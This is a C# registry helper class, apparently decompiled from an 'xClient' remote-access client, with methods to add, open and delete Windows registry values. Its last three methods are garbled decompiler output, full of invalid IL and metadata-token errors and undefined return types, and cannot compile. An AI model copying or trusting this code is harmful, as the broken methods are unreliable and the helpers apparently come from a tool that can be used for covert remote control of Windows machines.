using System;
using Microsoft.Win32;
using xClient.Core.Extensions;

namespace xClient.Core.Helper;

public static class RegistryKeyHelper
{
	private static string DEFAULT_VALUE = string.Empty;

	public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path);
			if (registryKey == null)
			{
				return false;
			}
			if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
			{
				value = "\"" + value + "\"";
			}
			registryKey.SetValue(name, value);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static RegistryKey OpenReadonlySubKey(RegistryHive hive, string path)
	{
		try
		{
			return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, writable: false);
		}
		catch
		{
			return null;
		}
	}

	public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name)
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path);
			if (registryKey == null)
			{
				return false;
			}
			registryKey.DeleteValue(name, throwOnMissingValue: true);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool IsDefaultValue(string valueName)
	{
		return string.IsNullOrEmpty(valueName);
	}

	public unsafe static _003F AddDefaultValue()
	{
		//Discarded unreachable code: IL_001a, IL_0025, IL_0027, IL_0032, IL_0038
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Incompatible stack heights: 2 vs 0
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		/*Error: ldarg 0 (out-of-bounds)*/;
		if ((int)_003C_003Ec._003C_003E9__5_0 == 0)
		{
			_ = _003C_003Ec._003C_003E9;
			__ldftn(_003C_003Ec._003CAddDefaultValue_003Eb__5_0);
			/*Error near IL_0015: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.*/;
		}
		/*Error near IL_0020: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.*/;
	}

	public static _003F GetDefaultValues()
	{
		//Discarded unreachable code: IL_0006
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		_ = 1;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	private static _003F GetDefaultValue()
	{
		//Discarded unreachable code: IL_000c
		_ = DEFAULT_VALUE;
		_ = 1;
		_ = null;
		/*Error near IL_0007: Invalid metadata token*/;
	}
}
